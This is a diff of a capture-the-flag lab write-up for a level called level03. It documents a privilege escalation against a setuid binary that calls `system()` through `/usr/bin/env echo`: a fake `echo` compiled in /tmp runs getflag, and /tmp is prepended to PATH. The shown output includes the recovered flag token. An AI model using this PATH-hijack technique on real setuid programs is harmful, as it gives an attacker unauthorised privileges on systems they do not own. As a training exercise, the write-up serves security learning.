@@ -1,3 +1,37 @@
-- List the files in level03 user home directory to find 'level03' executable which displays 'Exploit me' when launched.
+- List the files in level03 user home directory to find 'level03' executable and get informations about it.
 
--
+`ls -l`
+-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
+
+- Note that the owner of the file is flag03, and that the setuid control bit is active.
+
+- Actually, the user level03 can execute this file as the user flag03, the one we need to get the level04 flag.
+
+- Use ltrace to take a look at the functions called inside the executable.
+
+`ltrace ./level03`
+__libc_start_main(0x80484a4, 1, 0xbffff7f4, 0x8048510, 0x8048580 <unfinished ...>
+getegid()                                                                                     = 2003
+geteuid()                                                                                     = 2003
+setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                           = 0
+setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                           = 0
+system("/usr/bin/env echo Exploit me"Exploit me
+ <unfinished ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                                        = 0
++++ exited (status 0) +++
+
+- The function 'system()' which executes a shell command (echo Exploit me) is called here so we will exploit it as suggested :-).
+
+- Write a simple program called echo and make it execute 'getflag'. Due to permissions restrictions, use the '/tmp' folder to create it.
+
+`cd /tmp`
+`vim/emacs/nano/... echo.c` # see attached file
+`gcc echo.c -o echo`
+
+- Go back to level03 home folder, add the path of our echo executable in user environment, then execute level03 file.
+
+`cd ~`
+`export PATH=/tmp:$PATH` # append '/tmp' folder in front of the current PATH variable, ensuring it will be the first path used to search for the executables.
+`./level03`
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
